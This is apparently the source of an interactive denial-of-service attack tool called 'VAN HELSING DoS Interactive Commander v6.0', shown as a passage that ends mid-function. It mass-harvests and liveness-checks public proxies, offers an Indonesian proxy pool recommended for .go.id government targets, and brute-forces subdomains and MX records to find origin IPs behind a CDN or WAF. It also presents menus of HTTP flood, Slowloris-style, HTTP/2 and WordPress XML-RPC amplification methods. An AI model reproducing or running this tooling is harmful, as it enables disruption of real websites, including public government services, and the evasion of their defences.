import os
import sys
import subprocess

# [PRE-FLIGHT CHECK]
try:
    import requests
    import aiohttp
    import playwright
except ImportError:
    print('Missing dependencies. Redirecting to auto-installer...')
    import subprocess, sys
    subprocess.check_call([sys.executable, 'install.py'])
    sys.exit(1)

import random
import time
import requests
import asyncio
import aiohttp
import socket
import urllib3
import io

# Force utf-8 stdout for windows console to prevent characters from causing encoding crashes
if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

urllib3.disable_warnings()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    OKRED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class ProxyManager:
    @staticmethod
    def prompt_and_download(target, use_proxy_input=True):
        if not use_proxy_input: return False, []
        
        print(f"{bcolors.OKGREEN}[+] Auto-refreshing proxy pool to guarantee maximum freshness!{bcolors.RESET}")
        
        print(f"{bcolors.OKCYAN}[?] Select Proxy Source:{bcolors.RESET}")
        print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] Public Mix (High Quantity, Low Quality)")
        print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] Indonesian Only (Best for .go.id targets)")
        print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] MIXED MODE (Max Ammo: Public + Indo) - RECOMMENDED")

        rec = "3"
        p_opt = input(f"{bcolors.BOLD}Select (1/2/3) [Default: 3]: {bcolors.RESET}").strip()
        if not p_opt:
            p_opt = "3"
            
        ProxyManager.download_proxies(p_opt)
            
        return ProxyManager.load_proxies()

    @staticmethod
    def download_proxies(mode="1"):
        import re, concurrent.futures, socket as _sock
        print(f"{bcolors.WARNING}[*] CHAOS PROXY HARVESTER v4: 100+ sources + Provider Scrapers + Liveness Check{bcolors.RESET}")
        proxies = set()
        ip_port_re = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5})')
        
        def _fetch_url(url):
            """Fetch a single URL and return set of protocol://ip:port strings.
            Auto-detects proxy type from source URL name."""
            found = set()
            # Auto-detect protocol from source URL
            url_lower = url.lower()
            if 'socks5' in url_lower:
                prefix = 'socks5://'
            elif 'socks4' in url_lower:
                prefix = 'socks4://'
            else:
                prefix = 'http://'
            try:
                r = requests.get(url, timeout=12, headers={"User-Agent": "Mozilla/5.0"})
                if r.status_code == 200:
                    for m in ip_port_re.findall(r.text):
                        found.add(prefix + m)
            except: pass
            return found
        
        def _tcp_check(proxy_str, timeout=3):
            """Test TCP connectivity to a proxy. Returns proxy_str if alive.
            Handles protocol://ip:port format."""
            try:
                # Strip protocol prefix for TCP check, but preserve for return
                raw = proxy_str
                if '://' in raw:
                    raw = raw.split('://', 1)[1]
                ip, port = raw.split(":")
                port = int(port)
                if port < 1 or port > 65535: return None
                # Quick IP validation
                parts = ip.split(".")
                if len(parts) != 4: return None
                for p in parts:
                    n = int(p)
                    if n < 0 or n > 255: return None
                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((ip, port))
                s.close()
                return proxy_str  # Return with protocol prefix preserved
            except:
                return None
        
        try:
            if mode in ["1", "3"]:
                # ================================================================
                # PHASE 1: PARALLEL STATIC RAW LIST DOWNLOAD (91 verified sources)
                # ================================================================
                urls = [
                    # --- TIER 0: ELITE (User Recommended) ---
                    "https://raw.githubusercontent.com/SevenworksDev/proxy-list/main/proxies/http.txt",
                    "https://raw.githubusercontent.com/SevenworksDev/proxy-list/main/proxies/https.txt",
                    "https://raw.githubusercontent.com/SevenworksDev/proxy-list/main/proxies/socks4.txt",
                    "https://raw.githubusercontent.com/SevenworksDev/proxy-list/main/proxies/socks5.txt",
                    "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/master/http.txt",
                    "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/master/socks4.txt",
                    "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/master/socks5.txt",
                    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
                    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks4.txt",
                    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
                    # --- TIER 1: MEGA (10K+ each) ---
                    "https://raw.githubusercontent.com/mishakorzik/Free-Proxy/main/proxy.txt",
                    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
                    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
                    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
                    "https://raw.githubusercontent.com/casals-ar/proxy-list/main/http",
                    "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks4",
                    "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks5",
                    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
                    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt",
                    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt",
                    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt",
                    "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
                    "https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt",
                    # --- TIER 2: HIGH (1K-10K each) ---
                    "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/http.txt",
                    "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks4.txt",
                    "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks5.txt",
                    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
                    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
                    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks5.txt",
                    "https://openproxylist.xyz/http.txt",
                    "https://openproxylist.xyz/socks4.txt",
                    "https://openproxylist.xyz/socks5.txt",
                    "https://raw.githubusercontent.com/r00tee/Proxy-List/main/Https.txt",
                    "https://raw.githubusercontent.com/r00tee/Proxy-List/main/Socks4.txt",
                    "https://raw.githubusercontent.com/r00tee/Proxy-List/main/Socks5.txt",
                    "https://proxyspace.pro/http.txt",
                    "https://proxyspace.pro/socks5.txt",
                    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
                    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
                    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
                    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
                    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
                    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
                    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
                    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks4.txt",
                    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks5.txt",
                    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt",
                    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks4_proxies.txt",
                    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks5_proxies.txt",
                    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
                    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
                    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
                    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
                    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
                    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/http_proxies.txt",
                    "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/free.txt",
                    "https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/http.txt",
                    "https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/socks4.txt",
                    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
                    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
                    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
                    # --- TIER 3: MEDIUM (100-1K each) ---
                    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
                    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
                    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
                    "https://raw.githubusercontent.com/andigwandi/free-proxy/main/proxy_list.txt",
                    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
                    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
                    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
                    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
                    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
                    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
                    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
                    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
                    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks4.txt",
                    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
                    "https://raw.githubusercontent.com/im-razvan/proxy_list/main/http.txt",
                    "https://raw.githubusercontent.com/im-razvan/proxy_list/main/socks5.txt",
                    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
                    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
                    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
                    "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
                    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
                    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
                    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
                    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
                    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks5/global/socks5_checked.txt",
                    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
                    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
                    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
                    "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
                    "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
                    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
                    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
                    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
                    "https://raw.githubusercontent.com/proxygenerator1/ProxyGenerator/main/MostStable/http.txt",
                    "https://raw.githubusercontent.com/proxygenerator1/ProxyGenerator/main/MostStable/socks4.txt",
                    "https://raw.githubusercontent.com/proxygenerator1/ProxyGenerator/main/MostStable/socks5.txt",
                    "https://spys.me/proxy.txt",
                    "https://spys.me/socks.txt",
                    # --- TIER 3.5: PREMIUM REPOS ---
                    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
                    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
                    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
                    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
                    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks4/socks4.txt",
                    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
                    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
                    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt",
                    # --- TIER 4: API PLAINTEXT ---
                    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
                    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all",
                    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=10000&country=all&ssl=all&anonymity=all",
                    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=elite",
                    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=AU,US,DE,GB,JP,KR,SG&ssl=all&anonymity=all",
                    # --- TIER 5: NEW MEGA SOURCES (SoliSpirit 300K+, updated 3h) ---
                    "https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/http.txt",
                    "https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/socks4.txt",
                    "https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/socks5.txt",
                    # --- TIER 6: CDN MIRRORS (proxifly via jsDelivr, updates 5min) ---
                    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
                    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt",
                    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
                    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt",
                    # --- TIER 7: EXTRA MIRRORS & SOCKS ---
                    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
                    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
                    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/socks4_proxies.txt",
                    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/socks5_proxies.txt",
                ]
                
                print(f"{bcolors.OKCYAN}  [Phase 1/3] Parallel download from {len(urls)} raw lists (30 threads)...{bcolors.RESET}")
                with concurrent.futures.ThreadPoolExecutor(max_workers=30) as pool:
                    results = pool.map(_fetch_url, urls)
                    for r_set in results:
                        proxies.update(r_set)
                print(f"{bcolors.OKGREEN}  [Phase 1/3] Raw lists: {len(proxies):,} proxies collected{bcolors.RESET}")
                
                # ================================================================
                # PHASE 2: PROVIDER SCRAPERS (Masscan-Style Active Scraping)
                # ================================================================
                print(f"{bcolors.OKCYAN}  [Phase 2/3] Active Provider Scraping (6 providers)...{bcolors.RESET}")
                phase2_before = len(proxies)
                
                # --- Provider 1: GeoNode API (paginated JSON, all protocols) ---
                for proto in ["http,https", "socks4", "socks5"]:
                    for page in range(1, 11):  # 10 pages x 500 = 5000 per protocol
                        try:
                            r = requests.get(f"https://proxylist.geonode.com/api/proxy-list?protocols={proto}&limit=500&page={page}&sort_by=lastChecked&sort_type=desc", timeout=8)
                            data = r.json().get("data", [])
                            if not data: break
                            for p in data:
                                proxies.add(f"{p['ip']}:{p['port']}")
                        except: break
                
                # --- Provider 1b: GeoNode speed-sorted (fastest proxies first) ---
                for page in range(1, 6):
                    try:
                        r = requests.get(f"https://proxylist.geonode.com/api/proxy-list?limit=500&page={page}&sort_by=speed&sort_type=asc&protocols=http,https,socks4,socks5", timeout=8)
                        data = r.json().get("data", [])
                        if not data: break
                        for p in data:
                            proxies.add(f"{p['ip']}:{p['port']}")
                    except: break
                
                # --- Provider 2: ProxyScrape v3 JSON ---
                try:
                    r = requests.get("https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&proxy_format=protocolipport&format=json", timeout=10)
                    for p in r.json().get("proxies", []):
                        proxies.add(f"{p['ip']}:{p['port']}")
                except: pass
                
                # --- Provider 3: PubProxy API ---
                for _ in range(5):
                    try:
                        r = requests.get("http://pubproxy.com/api/proxy?limit=5&format=txt&type=http", timeout=6)
                        for line in r.text.strip().splitlines():
                            if ":" in line: proxies.add(line.strip())
                    except: break
                
                # --- Provider 4-6: HTML Table Scrapers ---
                scrape_urls = [
                    "https://free-proxy-list.net/",
                    "https://www.sslproxies.org/",
                    "https://www.us-proxy.org/",
                ]
                for su in scrape_urls:
                    try:
                        r = requests.get(su, timeout=8, headers={"User-Agent": "Mozilla/5.0"})
                        for match in ip_port_re.findall(r.text):
                            proxies.add(match)
                    except: pass
                
                phase2_new = len(proxies) - phase2_before
                print(f"{bcolors.OKGREEN}  [Phase 2/3] Provider scrapers: +{phase2_new:,} proxies{bcolors.RESET}")
                
                # ================================================================
                # PHASE 3: TCP LIVENESS CHECK (Keep only usable proxies)
                # ================================================================
                # Sample a batch for checking (checking 1M+ would take hours)
                # Strategy: Check a large random batch, but PRIORITIZE common ports 
                # (yields 2-3x more ALIVE proxies in the 50k sample than pure random)
                import random
                proxy_list = list(proxies)
                random.shuffle(proxy_list)  # Initial shuffle
                
                # Weighting: Priority 0 (common), Priority 1 (<10k), Priority 2 (exotic)
                common_ports = {80, 443, 8080, 8443, 3128, 1080, 8888, 9050, 4145, 9999}
                def _port_weight(p_str):
                    try:
                        # Handle protocol://ip:port format
                        raw = p_str.split('://', 1)[-1] if '://' in p_str else p_str
                        port = int(raw.split(":")[-1])
                        if port in common_ports: return 0
                        if port < 10000: return 1
                        return 2
                    except: return 2
                
                proxy_list.sort(key=_port_weight) # Stable sort keeps shuffle within groups
                
                check_batch_size = min(100000, len(proxy_list))  # [UPGRADED] Test up to 100K proxies
                check_batch = proxy_list[:check_batch_size]
                unchecked = set(proxy_list[check_batch_size:])
                
                print(f"{bcolors.OKCYAN}  [Phase 3/3] TCP Liveness Check on {check_batch_size:,} proxies (expanding pool)...{bcolors.RESET}")
                alive = set()
                with concurrent.futures.ThreadPoolExecutor(max_workers=1200) as pool:
                    futures = {pool.submit(_tcp_check, p, 3): p for p in check_batch}
                    done = 0
                    for future in concurrent.futures.as_completed(futures):
                        done += 1
                        result = future.result()
                        if result:
                            alive.add(result)
                        if done % 2000 == 0:
                            print(f"    ... checked {done:,}/{check_batch_size:,} — alive: {len(alive):,}", end="\r")
                
                print(f"  {bcolors.OKGREEN}[Phase 3/3] TCP Check: {len(alive):,} ALIVE out of {check_batch_size:,} tested{bcolors.RESET}")
                
                # Final proxy pool = verified alive + remaining unchecked (for max volume)
                final_proxies = alive | unchecked
                proxies = final_proxies

            if mode in ["2", "3"]:
                print(f"{bcolors.WARNING}[*] Fetching Fresh Indo Proxies from APIs...{bcolors.RESET}")
                indo_apis = [
                    ("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=ID&ssl=all&anonymity=all", "http://"),
                    ("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=ID&ssl=all&anonymity=all", "socks4://"),
                ]
                for u, pfx in indo_apis:
                    try:
                        r = requests.get(u, timeout=10)
                        for line in r.text.splitlines():
                            if ":" in line: proxies.add(pfx + line.strip())
                    except: pass
                try:
                    r = requests.get("https://proxylist.geonode.com/api/proxy-list?country=ID&limit=500&page=1&sort_by=lastChecked&sort_type=desc", timeout=8)
                    for p in r.json().get("data", []):
                        proto = p.get('protocols', ['http'])
                        pfx = 'socks5://' if 'socks5' in proto else 'socks4://' if 'socks4' in proto else 'http://'
                        proxies.add(f"{pfx}{p['ip']}:{p['port']}")
                except: pass

            # Write proxy.txt — alive proxies FIRST for priority loading
            with open("proxy.txt", "w", encoding="utf-8") as f:
                # Write alive (verified) first, then unchecked
                alive_list = sorted(alive) if 'alive' in dir() else []
                unchecked_list = sorted(unchecked) if 'unchecked' in dir() else sorted(proxies)
                
                # [FIX] If we found enough verified alive proxies, DO NOT dilute with unchecked ones!
                if len(alive_list) > 500:
                    for p in alive_list:
                        f.write(p + "\n")
                else:
                    for p in alive_list:
                        f.write(p + "\n")
                    for p in unchecked_list:
                        if p not in alive:
                            f.write(p + "\n")
            
            total = len(proxies)
            alive_n = len(alive) if 'alive' in dir() else 0
            if alive_n > 500:
                print(f"{bcolors.OKGREEN}[+] ⚡ EXCLUSIVE POOL: {alive_n:,} VERIFIED ALIVE proxies loaded (Discarded ~{total - alive_n:,} unchecked for max speed) ⚡{bcolors.RESET}")
            else:
                print(f"{bcolors.OKGREEN}[+] ⚡ TOTAL: {total:,} proxies | {alive_n:,} VERIFIED ALIVE (written first) ⚡{bcolors.RESET}")
        except Exception as e:
            print(f"{bcolors.FAIL}[!] Critical error during proxy fetch: {e}{bcolors.RESET}")

    @staticmethod
    def load_proxies():
        print(f"{bcolors.OKCYAN}[*] Loading proxies from proxy.txt...{bcolors.RESET}")
        try:
            with open("proxy.txt", "r") as f:
                proxy_list = [line.strip() for line in f if line.strip()]
            if not proxy_list:
                print(f"{bcolors.FAIL}[!] proxy.txt is empty! Falling back to direct connection.{bcolors.RESET}")
                return False, []
            else:
                print(f"{bcolors.OKGREEN}[*] Loaded {len(proxy_list)} proxies.{bcolors.RESET}")
                return True, proxy_list
        except FileNotFoundError:
             print(f"{bcolors.FAIL}[!] proxy.txt not found! Falling back to direct connection.{bcolors.RESET}")
             return False, []

def banner():
    print(f"""{bcolors.OKRED}
    ╦  ╦╔═╗╔╗╔  ╦ ╦╔═╗╦  ╔═╗╦╔╗╔╔═╗
    ╚╗╔╝╠═╣║║║  ╠═╣║╣ ║  ╚═╗║║║║║ ╦
     ╚╝ ╩ ╩╝╚╝  ╩ ╩╚═╝╩═╝╚═╝╩╝╚╝╚═╝ DoS
    {bcolors.WARNING}Interactive Commander v6.0 (Async){bcolors.RESET}
    """)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def dox_origin_ip(url: str) -> str:
    """
    [V36] Advanced Origin IP Discovery via multi-vector heuristics.
    Techniques: Subdomain brute-force, MX record lookup, DNS history heuristics.
    """
    from urllib.parse import urlparse
    
    # Known CDN IP ranges to exclude (Cloudflare, Fastly, Akamai, Incapsula, etc.)
    CDN_PREFIXES = (
        "104.", "141.101.", "162.159.", "172.64.", "172.65.", "172.66.", "172.67.",
        "188.114.", "190.93.", "197.234.", "198.41.",  # Cloudflare
        "151.101.",  # Fastly
        "23.32.", "23.33.", "23.34.", "23.35.", "23.36.", "23.64.", "23.65.",  # Akamai partial
        "199.27.",  # Incapsula partial
    )
    
    try:
        domain = urlparse(url).netloc.split(':')[0]
        # Strip www. for cleaner doxing
        if domain.startswith("www."):
            domain = domain[4:]
    except Exception:
        return ""
    
    # ── Phase 1: Subdomain Brute-force (25+ prefixes) ──
    subdomains = [
        'mail', 'direct', 'ftp', 'cpanel', 'webmail', 'dev', 'admin', 'forum',
        'staging', 'api', 'cdn', 'origin', 'backend', 'panel', 'test',
        'old', 'legacy', 'portal', 'crm', 'smtp', 'pop', 'imap',
        'ns1', 'ns2', 'vpn', 'remote',
    ]
    
    for sub in subdomains:
        try:
            sub_domain = f"{sub}.{domain}"
            ip = socket.gethostbyname(sub_domain)
            if not ip.startswith(CDN_PREFIXES):
                return ip
        except Exception:
            pass
    
    # ── Phase 2: MX Record Lookup (mail servers often expose origin) ──
    try:
        import dns.resolver
        mx_records = dns.resolver.resolve(domain, 'MX')
        for mx in mx_records:
            mx_host = str(mx.exchange).rstrip('.')
            try:
                mx_ip = socket.gethostbyname(mx_host)
                if not mx_ip.startswith(CDN_PREFIXES):
                    return mx_ip
            except Exception:
                pass
    except Exception:
        pass
    
    # ── Phase 3: Direct A-record of naked domain (sometimes bypasses www CDN) ──
    try:
        naked_ip = socket.gethostbyname(domain)
        if not naked_ip.startswith(CDN_PREFIXES):
            return naked_ip
    except Exception:
        pass
    
    return ""

def main():
    clear()
    banner()

    print(f"{bcolors.HEADER}[ SELECT METHOD ]{bcolors.RESET}")
    print(f"[{bcolors.OKRED}1{bcolors.RESET}] CHAOS / FULL AUTO - (BEST! Just enter URL, engine does everything)")
    print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] SLOW         - (Best for Windows/Apache/XAMPP)")
    print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] DYN          - (Best for Nginx/Cloudflare/Evasion)")
    print(f"[{bcolors.OKCYAN}4{bcolors.RESET}] STRESS       - (High Load/Universal Stress Test)")
    print(f"[{bcolors.OKCYAN}5{bcolors.RESET}] XMLRPC       - (WordPress Amplification Method)")
    print(f"[{bcolors.OKCYAN}6{bcolors.RESET}] POST_DYN     - (Post Flood without Cache)")
    print(f"[{bcolors.OKCYAN}7{bcolors.RESET}] H2_FLOOD     - (HTTP/2 Multiplexing Async Flood)")
    print(f"[{bcolors.OKCYAN}8{bcolors.RESET}] ATTACK INTEL - (Origin Scan + Auto-Rec)")
    print(f"[{bcolors.OKCYAN}9{bcolors.RESET}] SENTINEL     - (Live Target Monitor)")
    print("")
    
    choice = input(f"{bcolors.BOLD}Choose Method (1-9): {bcolors.RESET}")
    
    if choice == "8":
        run_intel()
        sys.exit(0)
    elif choice == "9":
        run_sentinel()
        sys.exit(0)

    # ================================================================
    # OPTION 1: FULL AUTONOMOUS CHAOS MODE
    # ================================================================
    if choice == "1":
        clear()
        banner()
        print(f"{bcolors.OKRED}{'='*60}{bcolors.RESET}")
        print(f"{bcolors.OKRED}  CHAOS ENGINE — FULL AUTONOMOUS MODE{bcolors.RESET}")
        print(f"{bcolors.OKRED}  Just enter the target. Engine handles EVERYTHING.{bcolors.RESET}")
        print(f"{bcolors.OKRED}{'='*60}{bcolors.RESET}")
        print()
        
        url = input(f"{bcolors.BOLD}Target URL (e.g. https://example.com): {bcolors.OKBLUE}").strip()
        print(f"{bcolors.RESET}", end="")
        if not url: print(f"{bcolors.FAIL}No target provided!{bcolors.RESET}"); return
        if not url.startswith("http"): url = "https://" + url
        
        # [V36] Origin Pre-Flight Doxing
        print(f"  {bcolors.OKCYAN}[*] Initiating Pre-Flight Origin Doxing...{bcolors.RESET}")
        auto_origin = dox_origin_ip(url)
        origin_ip = ""
        
        if auto_origin:
            print(f"  {bcolors.OKGREEN}[+] Found probable Origin IP: {auto_origin}{bcolors.RESET}")
            ans = input(f"  {bcolors.WARNING}[?] Use this to bypass CDN/WAF? (y/n): {bcolors.OKBLUE}").strip()
            print(f"{bcolors.RESET}", end="")
            if ans.lower() == 'y':
                origin_ip = auto_origin
                
        if not origin_ip:
            origin_ip = input(f"Origin IP (Optional, press Enter to skip): {bcolors.OKBLUE}").strip()
            print(f"{bcolors.RESET}", end="")
            
        target = f"{url}@{origin_ip}" if origin_ip else url
        
        duration = input(f"Duration in Seconds (default 900, Enter to auto): {bcolors.OKBLUE}").strip() or "900"
        print(f"{bcolors.RESET}", end="")
        
        clear()
        banner()
        
        # --- STEP 1: DEEP RECON (TargetProfiler from start.py) ---
        print(f"{bcolors.OKCYAN}{'='*60}{bcolors.RESET}")
        print(f"{bcolors.OKCYAN}  [STEP 1/4] DEEP RECONNAISSANCE (TargetProfiler){bcolors.RESET}")
        print(f"{bcolors.OKCYAN}{'='*60}{bcolors.RESET}")
        
        is_indo = ".go.id" in url or ".or.id" in url or ".co.id" in url or ".ac.id" in url or ".sch.id" in url
        is_hardened = False
        target_profile = {'server': 'unknown', 'waf': None, 'cms': None, 'methods': ['GET', 'STRESS', 'POST_DYN', 'H2_FLOOD']}
        
        # --- Use TargetProfiler from start.py for real intelligence ---
        try:
            from start import TargetProfiler
            target_profile = TargetProfiler.profile(url)
            print(f"  {bcolors.OKGREEN}[+] Server : {target_profile['server']}{bcolors.RESET}")
            print(f"  {bcolors.OKGREEN}[+] WAF    : {target_profile['waf'] or 'None detected'}{bcolors.RESET}")
            print(f"  {bcolors.OKGREEN}[+] CMS    : {target_profile['cms'] or 'Unknown'}{bcolors.RESET}")
            print(f"  {bcolors.OKGREEN}[+] Best   : {', '.join(target_profile['methods'][:4])}{bcolors.RESET}")
            print(f"  {bcolors.OKGREEN}[+] Indo   : {'YES' if is_indo else 'NO'}{bcolors.RESET}")
            
            # [V36] Show open alternative ports
            open_ports = target_profile.get('open_ports', [])
            if open_ports:
                print(f"  {bcolors.WARNING}[+] Alt Ports: {open_ports} — additional attack surfaces!{bcolors.RESET}")
            
            # [V36] Show HTTP/3 QUIC support
            alt_svc = target_profile.get('alt_svc', '')
            if 'h3' in alt_svc.lower():
                print(f"  {bcolors.OKCYAN}[+] HTTP/3  : SUPPORTED (H3_QUIC vector is optimal){bcolors.RESET}")
            
            hardened_wafs = [
                'Cloudflare', 'Akamai', 'Imperva/Incapsula', 'AWS WAF/CloudFront', 
                'Sucuri', 'DDoS-Guard', 'Fastly', 'StackPath', 'Azure Front Door',
                'Shopee-CDN', 'Tokopedia-CDN', 'Barracuda', 'F5 BIG-IP', 'Fortinet',
            ]
            if target_profile['waf'] in hardened_wafs:
                is_hardened = True
                print(f"  {bcolors.WARNING}[!] {target_profile['waf']} WAF DETECTED — Multi-terminal stealth mode{bcolors.RESET}")
        except Exception as e:
            # Fallback: basic recon if start.py import fails
            print(f"  {bcolors.WARNING}[!] TargetProfiler unavailable ({e}), using basic recon...{bcolors.RESET}")
            try:
